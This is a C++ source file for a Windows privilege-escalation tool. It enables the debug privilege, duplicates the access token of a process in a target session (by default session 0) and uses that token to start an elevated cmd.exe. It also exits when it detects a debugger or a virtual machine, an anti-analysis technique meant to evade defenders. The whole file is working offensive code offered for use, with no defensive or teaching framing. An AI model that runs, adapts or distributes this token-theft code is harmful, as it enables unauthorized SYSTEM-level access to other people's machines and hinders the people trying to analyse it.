#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <Psapi.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <VersionHelpers.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

// Security checks and anti-debugging
class SecurityManager {
private:
    bool IsDebuggerPresent() {
        return ::IsDebuggerPresent();
    }

    bool IsRemoteDebuggerPresent() {
        BOOL isRemoteDebuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
        return isRemoteDebuggerPresent;
    }

    bool IsProcessRunningInVM() {
        unsigned int hypervisorBit = 0;
        __try {
            __asm {
                push eax
                push ebx
                push ecx
                push edx
                mov eax, 1
                cpuid
                bt ecx, 31
                setc hypervisorBit
                pop edx
                pop ecx
                pop ebx
                pop eax
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
        return hypervisorBit != 0;
    }

    bool VerifyProcessIntegrity() {
        HANDLE hProcess = GetCurrentProcess();
        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
            return false;
        }

        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &tokenInfoLength);
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            CloseHandle(hToken);
            return false;
        }

        std::vector<BYTE> tokenInfo(tokenInfoLength);
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, tokenInfo.data(), tokenInfoLength, &tokenInfoLength)) {
            CloseHandle(hToken);
            return false;
        }

        CloseHandle(hToken);
        return true;
    }

public:
    bool PerformSecurityChecks() {
        if (IsDebuggerPresent() || IsRemoteDebuggerPresent()) {
            return false;
        }

        if (IsProcessRunningInVM()) {
            return false;
        }

        return VerifyProcessIntegrity();
    }
};

// Logging system
class Logger {
private:
    std::ofstream logFile;
    std::string GetCurrentTime() {
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }

public:
    Logger(const std::string& filename) {
        logFile.open(filename, std::ios::app);
    }

    ~Logger() {
        if (logFile.is_open()) {
            logFile.close();
        }
    }

    void Log(const std::string& message, bool error = false) {
        std::string prefix = error ? "[ERROR] " : "[INFO] ";
        std::string logMessage = GetCurrentTime() + " " + prefix + message;
        std::cout << logMessage << std::endl;
        if (logFile.is_open()) {
            logFile << logMessage << std::endl;
        }
    }
};

// Command line argument parser
class ArgumentParser {
private:
    std::vector<std::string> args;
    DWORD targetSessionID = 0;
    std::string targetProcessName;

public:
    ArgumentParser(int argc, char* argv[]) {
        for (int i = 1; i < argc; ++i) {
            args.push_back(argv[i]);
        }
    }

    bool Parse() {
        for (size_t i = 0; i < args.size(); ++i) {
            if (args[i] == "--help") {
                ShowHelp();
                return false;
            }
            else if (args[i] == "--session" && i + 1 < args.size()) {
                targetSessionID = std::stoul(args[++i]);
            }
            else if (args[i] == "--process" && i + 1 < args.size()) {
                targetProcessName = args[++i];
            }
        }
        return true;
    }

    void ShowHelp() {
        std::cout << "Usage: privilege-escalation.exe [options]" << std::endl;
        std::cout << "Options:" << std::endl;
        std::cout << "  --help        Show this help message" << std::endl;
        std::cout << "  --session     Specify target session ID (default: 0)" << std::endl;
        std::cout << "  --process     Specify target process name" << std::endl;
    }

    DWORD GetTargetSessionID() const { return targetSessionID; }
    std::string GetTargetProcessName() const { return targetProcessName; }
};

// Process management
class ProcessManager {
private:
    Logger& logger;

public:
    ProcessManager(Logger& log) : logger(log) {}

    HANDLE GetProcessHandleBySessionID(DWORD sessionID) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            logger.Log("CreateToolhelp32Snapshot failed: " + std::to_string(GetLastError()), true);
            return nullptr;
        }

        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        HANDLE processHandle = nullptr;
        if (Process32First(snapshot, &processEntry)) {
            do {
                DWORD currentSessionID;
                if (ProcessIdToSessionId(processEntry.th32ProcessID, &currentSessionID) && currentSessionID == sessionID) {
                    processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processEntry.th32ProcessID);
                    if (processHandle) {
                        break;
                    }
                }
            } while (Process32Next(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
        return processHandle;
    }

    bool SpawnElevatedProcess(HANDLE token, const std::wstring& command) {
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi = { 0 };

        if (!CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, nullptr, const_cast<LPWSTR>(command.c_str()),
            CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
            logger.Log("CreateProcessWithTokenW failed: " + std::to_string(GetLastError()), true);
            return false;
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
};

bool EnablePrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(nullptr, lpszPrivilege, &luid)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "The token does not have the specified privilege." << std::endl;
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    Logger logger("privilege_escalation.log");
    logger.Log("Starting privilege escalation tool");

    SecurityManager security;
    if (!security.PerformSecurityChecks()) {
        logger.Log("Security checks failed", true);
        return 1;
    }

    ArgumentParser parser(argc, argv);
    if (!parser.Parse()) {
        return 1;
    }

    ProcessManager processManager(logger);

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        logger.Log("OpenProcessToken failed: " + std::to_string(GetLastError()), true);
        return 1;
    }

    if (!EnablePrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        logger.Log("Failed to enable debug privilege", true);
        CloseHandle(hToken);
        return 1;
    }

    CloseHandle(hToken);

    HANDLE processHandle = processManager.GetProcessHandleBySessionID(parser.GetTargetSessionID());
    if (!processHandle) {
        logger.Log("Failed to open target process: " + std::to_string(GetLastError()), true);
        return 1;
    }

    HANDLE processToken = nullptr;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &processToken)) {
        logger.Log("Failed to open process token: " + std::to_string(GetLastError()), true);
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE newToken = nullptr;
    if (!DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &newToken)) {
        logger.Log("Failed to duplicate token: " + std::to_string(GetLastError()), true);
        CloseHandle(processToken);
        CloseHandle(processHandle);
        return 1;
    }

    if (!processManager.SpawnElevatedProcess(newToken, L"cmd.exe")) {
        logger.Log("Failed to spawn elevated process", true);
        CloseHandle(newToken);
        CloseHandle(processToken);
        CloseHandle(processHandle);
        return 1;
    }

    CloseHandle(newToken);
    CloseHandle(processToken);
    CloseHandle(processHandle);

    logger.Log("Successfully spawned elevated command prompt");
    return 0;
}
